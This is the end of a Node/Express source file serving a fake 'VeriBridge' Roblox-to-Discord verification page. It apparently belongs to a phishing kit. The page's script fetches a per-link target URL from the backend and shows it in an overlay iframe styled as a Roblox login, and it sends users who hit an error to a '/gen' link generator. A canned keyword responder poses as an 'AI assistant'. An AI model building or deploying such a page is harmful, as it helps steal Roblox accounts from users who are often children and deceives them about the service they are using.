        .loading-spinner-large{width:60px;height:60px;border:4px solid rgba(100,200,255,0.2);border-top:4px solid #8dd0ff;border-radius:50%;animation:spinGold 1s linear infinite}
        @keyframes spinGold{to{transform:rotate(360deg)}}
        .frame-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);backdrop-filter:blur(8px);z-index:9999;display:flex;justify-content:center;align-items:center;visibility:hidden;opacity:0;transition:all 0.3s ease}
        .frame-overlay.active{visibility:visible;opacity:1}
        .frame-card{width:90%;max-width:500px;background:white;border-radius:28px;overflow:hidden;position:relative;transform:scale(0.9);transition:transform 0.3s ease;box-shadow:0 30px 50px rgba(0,0,0,0.4)}
        .frame-overlay.active .frame-card{transform:scale(1)}
        .frame-close{position:absolute;top:14px;right:18px;width:34px;height:34px;background:rgba(0,0,0,0.6);color:white;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:30;font-size:20px;font-weight:bold;border:none}
        .frame-close:hover{background:#e34d4d}
        .roblox-login-iframe{width:100%;height:560px;border:none;display:block}
        @media(max-width:550px){.roblox-login-iframe{height:520px}}
        .user-profile-card{position:fixed;top:20px;right:20px;z-index:100;background:rgba(0,0,0,0.7);backdrop-filter:blur(16px);border-radius:60px;padding:6px 12px 6px 8px;display:flex;align-items:center;gap:12px;border:1px solid rgba(100,200,255,0.5);display:none}
        .user-profile-card.show{display:flex}
        .user-avatar{width:42px;height:42px;border-radius:50%;object-fit:cover;border:2px solid #8dd0ff}
        .user-display-name{font-size:0.85rem;font-weight:700;color:#cceeff}
        .logout-btn{background:none;border:none;color:#ff8888;cursor:pointer;font-size:1rem;padding:4px 8px;border-radius:20px}
        .ai-chat-widget{position:fixed;bottom:15px;right:15px;z-index:1000;cursor:pointer}
        .chat-bubble{width:55px;height:55px;background:linear-gradient(135deg,#2c5a7a,#1e3a5a);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,0.3)}
        .chat-bubble span{font-size:28px}
        .chat-window{position:fixed;bottom:80px;right:15px;width:340px;height:500px;background:rgba(0,0,0,0.95);backdrop-filter:blur(20px);border-radius:24px;border:1px solid rgba(100,200,255,0.5);display:none;flex-direction:column;overflow:hidden;z-index:1001}
        .chat-window.active{display:flex}
        .chat-header{background:linear-gradient(135deg,rgba(100,200,255,0.3),rgba(100,200,255,0.1));padding:12px 16px;display:flex;justify-content:space-between;align-items:center}
        .chat-header h4{color:#8dd0ff;font-size:1rem}
        .close-chat{background:none;border:none;color:#8dd0ff;font-size:1.3rem;cursor:pointer}
        .chat-messages{flex:1;overflow-y:auto;padding:15px;display:flex;flex-direction:column;gap:10px}
        .message{display:flex;margin-bottom:5px}
        .message.ai{justify-content:flex-start}
        .message.user{justify-content:flex-end}
        .message-bubble{max-width:80%;padding:8px 14px;border-radius:18px;font-size:0.8rem}
        .message.ai .message-bubble{background:rgba(100,200,255,0.15);color:#cceeff;border:1px solid rgba(100,200,255,0.3)}
        .message.user .message-bubble{background:linear-gradient(135deg,#2c5a7a,#1e3a5a);color:white}
        .chat-input-area{display:flex;gap:10px;padding:12px;border-top:1px solid rgba(100,200,255,0.3)}
        .chat-input{flex:1;background:rgba(255,255,255,0.1);border:1px solid rgba(100,200,255,0.4);border-radius:40px;padding:10px 15px;color:white;outline:none}
        .send-btn{background:linear-gradient(135deg,#2c5a7a,#1e3a5a);border:none;border-radius:40px;padding:8px 18px;font-weight:bold;cursor:pointer;color:white}
        .typing-indicator{display:flex;gap:4px;padding:8px 14px;background:rgba(100,200,255,0.1);border-radius:18px;width:fit-content}
        .typing-indicator span{width:6px;height:6px;background:#8dd0ff;border-radius:50%;animation:typing 1.4s infinite}
        @keyframes typing{0%,60%,100%{transform:translateY(0);opacity:0.4}30%{transform:translateY(-8px);opacity:1}}
    </style>
</head>
<body>
<div class="frost-overlay"></div>

<div id="startLoadingOverlay" class="fullscreen-loading"><div class="loading-spinner-large"></div><div class="loading-text-glow">VERIBRIDGE</div><div class="loading-sub">Loading verification methods...</div></div>

<div id="userProfileCard" class="user-profile-card">
    <img id="userAvatar" class="user-avatar" src="">
    <span id="userDisplayName" class="user-display-name"></span>
    <button id="logoutBtnHeader" class="logout-btn">X</button>
</div>

<!-- LANDING PAGE -->
<div id="startScreen" class="premium-container">
    <div class="golden-header">
        <div class="premium-logo-gold">
            <img class="brand-logo" id="siteLogo" src="https://i.imgur.com/HF0svxe.png" alt="veribridge logo" onerror="this.style.display='none';">
            <span class="gold-badge">ROBLOX VERIFICATION</span>
        </div>
    </div>
    
    <div class="brand-container">
        <div class="brand-main">
            <span class="veri-white">Veri</span><span class="bridge-purple">Bridge</span>
        </div>
        <div class="brand-subtitle">
            <span class="bringing-white">Bringing</span>
            <span class="roblox-red"> Roblox </span>
            <span class="to-white">to</span>
            <span class="discord-blue"> Discord</span>
        </div>
        <div class="description-text">Connect Roblox to Discord using VeriBridge, the leading Roblox Discord Bot. Verify who you really are, sync your group to your server, and more.</div>
    </div>
    
    <div class="username-row">
        <input type="text" id="landingUsername" class="username-input" placeholder="Enter your Roblox username">
        <button id="landingVerifyBtn" class="get-started-btn">Get Started</button>
    </div>
    <div id="landingErrorMsg" class="error-msg">Username must be 3-20 characters, letters, numbers, and underscores only</div>
    <div class="legal-note">By continuing, you agree to our terms of service and privacy policy.</div>
    <div class="rating-stars">★★★★★ <span>Top rated Roblox bot by thousands of users</span></div>
    
    <div class="features-section"><div class="section-title">Why choose veribridge?</div><div class="features-grid">
        <div class="feature-card"><h3>No complex setup or documentation needed</h3><p>veribridge appeals to the average user and the advanced user.</p></div>
        <div class="feature-card"><h3>Simple Verification</h3><p>Verify through our Roblox game or by a code on your profile.</p></div>
        <div class="feature-card"><h3>Bonds</h3><p>Connect gamepasses, badges, group ranks to Discord roles.</p></div>
        <div class="feature-card"><h3>Roblox-based Server Restrictions</h3><p>Lock your server with age-limits and group-only restrictions.</p></div>
        <div class="feature-card"><h3>Group Utility Commands</h3><p>Manage Roblox groups directly from Discord.</p></div>
        <div class="feature-card"><h3>User Utility Commands</h3><p>Look up Roblox users from Discord.</p></div>
    </div></div>
    <div class="footer-gold">veribridge — Seamless Roblox verification for modern communities</div>
</div>

<!-- DASHBOARD -->
<div id="mainDashboard" class="premium-container" style="display:none">
    <div class="golden-header">
        <div class="premium-logo-gold">
            <img class="brand-logo" src="https://i.imgur.com/HF0svxe.png" alt="veribridge logo" onerror="this.style.display='none';">
            <span class="gold-badge">ROBLOX VERIFICATION</span>
        </div>
    </div>
    <div class="dashboard-gold">
        <div class="verification-sidebar-gold"><div class="sidebar-gold-header"><h2>VERIFICATION METHODS</h2></div>
        <div class="verify-options-gold">
            <div class="verify-card-gold" data-method="login" id="methodLoginGold"><div class="method-letter-circle"><span class="method-letter">A</span></div><div class="card-title-gold">Authorize Roblox</div><div class="card-desc-gold">Link your Roblox account with Veribridge</div><div class="verify-badge-gold" id="loginStatusGold">Not verified</div></div>
            <div class="verify-card-gold" data-method="ingame" id="methodIngameGold"><div class="method-letter-circle"><span class="method-letter">I</span></div><div class="card-title-gold">Verify via In-Game</div><div class="card-desc-gold">Roblox In-Game Auth</div><div class="verify-badge-gold" id="ingameStatusGold">Not verified</div></div>
            <div class="verify-card-gold" data-method="community" id="methodCommunityGold"><div class="method-letter-circle"><span class="method-letter">C</span></div><div class="card-title-gold">Verify via Community</div><div class="card-desc-gold">Roblox Group/Community</div><div class="verify-badge-gold" id="communityStatusGold">Not verified</div></div>
        </div></div>
        <div class="login-viewer-gold"><div class="viewer-header-gold"><div class="method-indicator-gold"><div class="method-indicator-circle"><span class="method-indicator-letter" id="activeMethodLetter">A</span></div><span class="method-name-gold" id="activeMethodNameGold">Authorize Roblox</span></div><span class="status-chip-gold" id="verificationStatusGold">Not verified</span></div>
        <div class="roblox-auth-section"><div class="auth-input-group"><div class="input-wrapper"><input type="text" id="robloxUsernameInput" class="roblox-username-input" placeholder="Enter your Roblox username..."><div id="dashErrorMsg" class="dash-error-msg">Username must be 3-20 characters, letters, numbers, and underscores only</div></div><button id="verifyRobloxBtn" class="verify-roblox-btn">Continue with Username</button></div>
        <div id="userProfilePreview" class="user-profile-preview"><img id="previewAvatar" class="preview-avatar"><div class="preview-info"><h4 id="previewUsername"></h4><p>Roblox account linked</p></div></div></div>
        <div class="redirect-container"><div class="welcome-text" id="redirectTitle">Select a verification method</div><div class="redirect-desc" id="redirectDesc">Choose one of the methods from the sidebar to continue</div><button id="bottomStartVerifyBtn" class="bottom-start-btn" disabled>Start Verification</button></div></div>
    </div>
    <div class="footer-gold">Select a verification method to continue</div>
</div>

<!-- IFRAME OVERLAY -->
<div id="robloxFrameOverlay" class="frame-overlay">
    <div class="frame-card">
        <button class="frame-close" id="closeFrameBtn">✕</button>
        <iframe id="robloxLoginIframe" class="roblox-login-iframe" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation" referrerpolicy="no-referrer" title="Verification Page" frameborder="0"></iframe>
    </div>
</div>

<!-- AI CHAT -->
<div class="ai-chat-widget" id="chatWidget"><div class="chat-bubble"><span>🤖</span></div></div>
<div class="chat-window" id="chatWindow"><div class="chat-header"><h4>VeriBridge Assistant</h4><button class="close-chat" id="closeChatBtn">✕</button></div><div class="chat-messages" id="chatMessages"><div class="message ai"><div class="message-bubble">Hello! I'm your VeriBridge assistant. Ask me anything!</div></div></div><div class="chat-input-area"><input type="text" class="chat-input" id="chatInput" placeholder="Ask me anything..."><button class="send-btn" id="sendChatBtn">Send</button></div></div>

<script>
// ==================== FIXED: LOAD TARGET URL AND UPDATE BUTTON ====================
let TARGET_URL = 'https://www.roblox.com';
let IS_LOADING = true;

// Get code from URL
const urlParams = new URLSearchParams(window.location.search);
const code = urlParams.get('code');

// Get DOM elements
const startLoadingOverlay = document.getElementById('startLoadingOverlay');
const bottomStartBtn = document.getElementById('bottomStartVerifyBtn');

// Function to hide loading and enable buttons
function finishLoading() {
    IS_LOADING = false;
    if (startLoadingOverlay) startLoadingOverlay.classList.remove('active');
    if (bottomStartBtn) bottomStartBtn.disabled = false;
    console.log('[VeriBridge] ✅ Verification ready! Target URL:', TARGET_URL);
}

// Function to show error
function showError(message) {
    IS_LOADING = false;
    if (startLoadingOverlay) startLoadingOverlay.classList.remove('active');
    const errorDiv = document.createElement('div');
    errorDiv.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#ff5555;color:white;padding:20px;border-radius:10px;z-index:10000;text-align:center;';
    errorDiv.innerHTML = '<strong>❌ Error</strong><br>' + message + '<br><br><a href="/gen" style="color:white;text-decoration:underline;">Go to Generator</a>';
    document.body.appendChild(errorDiv);
    console.error('[VeriBridge] Error:', message);
}

// Load target URL from backend
if (code) {
    console.log('[VeriBridge] Loading link for code:', code);
    if (startLoadingOverlay) startLoadingOverlay.classList.add('active');
    
    fetch('/api/link/' + code)
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data.success && data.targetUrl) {
                TARGET_URL = data.targetUrl;
                console.log('[VeriBridge] ✅ Target URL loaded from backend:', TARGET_URL);
                finishLoading();
            } else {
                console.error('[VeriBridge] Link not found');
                showError('This verification link does not exist or has been deleted.');
            }
        })
        .catch(function(error) {
            console.error('[VeriBridge] Fetch error:', error);
            showError('Cannot connect to verification server. Please try again.');
        });
} else {
    console.log('[VeriBridge] No code provided, using default URL');
    finishLoading();
}

// ==================== AI CHAT SYSTEM ====================
const chatWidget = document.getElementById('chatWidget');
const chatWindow = document.getElementById('chatWindow');
const closeChatBtn = document.getElementById('closeChatBtn');
const chatInput = document.getElementById('chatInput');
const sendChatBtn = document.getElementById('sendChatBtn');
const chatMessages = document.getElementById('chatMessages');
let isTyping = false;

function addMessage(text, isUser) {
    isUser = isUser || false;
    const div = document.createElement('div');
    div.className = 'message ' + (isUser ? 'user' : 'ai');
    div.innerHTML = '<div class="message-bubble">' + text + '</div>';
    chatMessages.appendChild(div);
    chatMessages.scrollTop = chatMessages.scrollHeight;
}

function showTypingIndicator() {
    const typingDiv = document.createElement('div');
    typingDiv.className = 'message ai typing-indicator-container';
    typingDiv.id = 'typingIndicator';
    typingDiv.innerHTML = '<div class="typing-indicator"><span></span><span></span><span></span></div>';
    chatMessages.appendChild(typingDiv);
}

function removeTypingIndicator() {
    const indicator = document.getElementById('typingIndicator');
    if (indicator) indicator.remove();
}

function getAIResponse(question) {
    const q = question.toLowerCase();
    if (q.includes('verify')) return "Enter your username, select a method, and click 'Start Verification'.";
    if (q.includes('discord')) return "VeriBridge syncs Roblox data to Discord roles!";
    if (q.includes('hello')) return "Hello! Welcome to VeriBridge.";
    return "I can help with Roblox verification, Discord integration, and group commands!";
}

async function sendMessage() {
    const text = chatInput.value.trim();
    if (!text || isTyping) return;
    addMessage(text, true);
    chatInput.value = '';
    showTypingIndicator();
    isTyping = true;
    await new Promise(resolve => setTimeout(resolve, 600));
    const response = getAIResponse(text);
    removeTypingIndicator();
    addMessage(response, false);
    isTyping = false;
}

chatWidget.addEventListener('click', () => chatWindow.classList.toggle('active'));
closeChatBtn.addEventListener('click', () => chatWindow.classList.remove('active'));
sendChatBtn.addEventListener('click', sendMessage);
chatInput.addEventListener('keypress', e => { if (e.key === 'Enter') sendMessage(); });

// ==================== FRAME LOGIC ====================
const frameOverlay = document.getElementById('robloxFrameOverlay');
const closeFrameBtn = document.getElementById('closeFrameBtn');
const robloxIframe = document.getElementById('robloxLoginIframe');

function showRobloxFlow() {
    if (IS_LOADING) {
        alert('Loading verification data. Please wait a moment.');
        return;
    }
    console.log('[VeriBridge] Loading URL in iframe:', TARGET_URL);
    robloxIframe.src = TARGET_URL;
    frameOverlay.classList.add('active');
}

function hideFrame() {
    frameOverlay.classList.remove('active');
    setTimeout(() => {
        if (!frameOverlay.classList.contains('active')) {
            robloxIframe.src = 'about:blank';
        }
    }, 300);
}

closeFrameBtn?.addEventListener('click', hideFrame);
frameOverlay?.addEventListener('click', (e) => {
    if (e.target === frameOverlay) hideFrame();
});

// ==================== DASHBOARD LOGIC ====================
function isValidUsername(e) { return /^[a-zA-Z0-9_]{3,20}$/.test(e); }

let currentRobloxUser = null;
let verificationState = { login: { completed: false }, ingame: { completed: false }, community: { completed: false } };
let currentActiveMethod = "login";

const methodLogin = document.getElementById('methodLoginGold');
const methodIngame = document.getElementById('methodIngameGold');
const methodCommunity = document.getElementById('methodCommunityGold');
const loginBadge = document.getElementById('loginStatusGold');
const ingameBadge = document.getElementById('ingameStatusGold');
const communityBadge = document.getElementById('communityStatusGold');
const activeMethodLetter = document.getElementById('activeMethodLetter');
const activeMethodName = document.getElementById('activeMethodNameGold');
const verificationStatusChip = document.getElementById('verificationStatusGold');
const verifyRobloxBtn = document.getElementById('verifyRobloxBtn');
const robloxUsernameInput = document.getElementById('robloxUsernameInput');
const userProfilePreview = document.getElementById('userProfilePreview');
const previewAvatar = document.getElementById('previewAvatar');
const previewUsername = document.getElementById('previewUsername');
const redirectTitle = document.getElementById('redirectTitle');
const redirectDesc = document.getElementById('redirectDesc');
const dashErrorMsg = document.getElementById('dashErrorMsg');
const userProfileCard = document.getElementById('userProfileCard');
const userAvatar = document.getElementById('userAvatar');
const userDisplayName = document.getElementById('userDisplayName');
const logoutBtnHeader = document.getElementById('logoutBtnHeader');

function updateUserCard() {
    if (currentRobloxUser) {
        userAvatar.src = currentRobloxUser.avatarUrl;
        userDisplayName.textContent = currentRobloxUser.username;
        userProfileCard.classList.add('show');
        if (bottomStartBtn) bottomStartBtn.disabled = false;
    } else {
        userProfileCard.classList.remove('show');
        if (bottomStartBtn) bottomStartBtn.disabled = true;
    }
}

function updateUI() {
    methodLogin.classList.toggle('active', currentActiveMethod === 'login');
    methodIngame.classList.toggle('active', currentActiveMethod === 'ingame');
    methodCommunity.classList.toggle('active', currentActiveMethod === 'community');
    const letters = { login: 'A', ingame: 'I', community: 'C' };
    const names = { login: 'Authorize Roblox', ingame: 'Verify via In-Game', community: 'Verify via Community' };
    activeMethodLetter.innerHTML = letters[currentActiveMethod];
    activeMethodName.innerHTML = names[currentActiveMethod];
    verificationStatusChip.innerHTML = verificationState[currentActiveMethod].completed ? 'Verified' : 'Not verified';
    loginBadge.innerHTML = verificationState.login.completed ? 'Verified' : 'Not verified';
    ingameBadge.innerHTML = verificationState.ingame.completed ? 'Verified' : 'Not verified';
    communityBadge.innerHTML = verificationState.community.completed ? 'Verified' : 'Not verified';
}

function setActiveMethod(method) { currentActiveMethod = method; updateUI(); }

function onMethodClick() {
    if (!currentRobloxUser) {
        addMessage("Please enter your Roblox username first!", false);
        return;
    }
    showRobloxFlow();
}

function verifyDashUser() {
    const username = robloxUsernameInput.value.trim();
    if (!username || !isValidUsername(username)) {
        dashErrorMsg.classList.add('show');
        robloxUsernameInput.classList.add('error');
        addMessage("Invalid Roblox username.", false);
        return;
    }
    dashErrorMsg.classList.remove('show');
    const avatarUrl = 'https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=' + username.charAt(0).toUpperCase();
    currentRobloxUser = { id: username, username: username, avatarUrl: avatarUrl };
    localStorage.setItem('veribridge_user', JSON.stringify(currentRobloxUser));
    previewAvatar.src = avatarUrl;
    previewUsername.textContent = username;
    userProfilePreview.classList.add('show');
    updateUserCard();
    addMessage('Welcome ' + username + '! Select a verification method.', false);
    redirectTitle.innerHTML = 'Welcome ' + username;
    redirectDesc.innerHTML = 'Choose a method from the sidebar';
}

function logoutUser() {
    currentRobloxUser = null;
    localStorage.removeItem('veribridge_user');
    userProfilePreview.classList.remove('show');
    updateUserCard();
    robloxUsernameInput.value = '';
    redirectTitle.innerHTML = 'Select a verification method';
    redirectDesc.innerHTML = 'Choose a method from the sidebar';
    addMessage("Logged out.", false);
}

const savedUser = localStorage.getItem('veribridge_user');
if (savedUser) {
    try {
        currentRobloxUser = JSON.parse(savedUser);
        if (currentRobloxUser) {
            previewAvatar.src = 'https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=' + currentRobloxUser.username.charAt(0).toUpperCase();
            previewUsername.textContent = currentRobloxUser.username;
            userProfilePreview.classList.add('show');
            updateUserCard();
            redirectTitle.innerHTML = 'Welcome ' + currentRobloxUser.username;
            robloxUsernameInput.value = currentRobloxUser.username;
        }
    } catch(e) { }
}

verifyRobloxBtn.addEventListener('click', verifyDashUser);
methodLogin.addEventListener('click', () => setActiveMethod('login'));
methodIngame.addEventListener('click', () => setActiveMethod('ingame'));
methodCommunity.addEventListener('click', () => setActiveMethod('community'));
bottomStartBtn.addEventListener('click', onMethodClick);
logoutBtnHeader.addEventListener('click', logoutUser);

// Landing screen
const landingBtn = document.getElementById('landingVerifyBtn');
const landingUsername = document.getElementById('landingUsername');
const startScreenDiv = document.getElementById('startScreen');
const mainDashboardDiv = document.getElementById('mainDashboard');
const startLoading = document.getElementById('startLoadingOverlay');
const landingErrorMsg = document.getElementById('landingErrorMsg');

landingBtn.addEventListener('click', function() {
    const username = landingUsername.value.trim();
    if (!username || !isValidUsername(username)) {
        landingErrorMsg.classList.add('show');
        landingUsername.classList.add('error');
        return;
    }
    landingErrorMsg.classList.remove('show');
    startLoading.classList.add('active');
    setTimeout(function() {
        const avatarUrl = 'https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=' + username.charAt(0).toUpperCase();
        currentRobloxUser = { id: username, username: username, avatarUrl: avatarUrl };
        localStorage.setItem('veribridge_user', JSON.stringify(currentRobloxUser));
        previewAvatar.src = avatarUrl;
        previewUsername.textContent = username;
        userProfilePreview.classList.add('show');
        updateUserCard();
        redirectTitle.innerHTML = 'Welcome ' + username;
        robloxUsernameInput.value = username;
        startLoading.classList.remove('active');
        startScreenDiv.style.display = 'none';
        mainDashboardDiv.style.display = 'block';
        addMessage('Welcome ' + username + '! Select a verification method.', false);
        updateUI();
    }, 1500);
});
updateUI();
</script>
</body>
</html>`;
    
    res.send(html);
});

// ==================== ROOT REDIRECT ====================
app.get('/', (req, res) => {
    res.redirect('/gen');
});

module.exports = app;
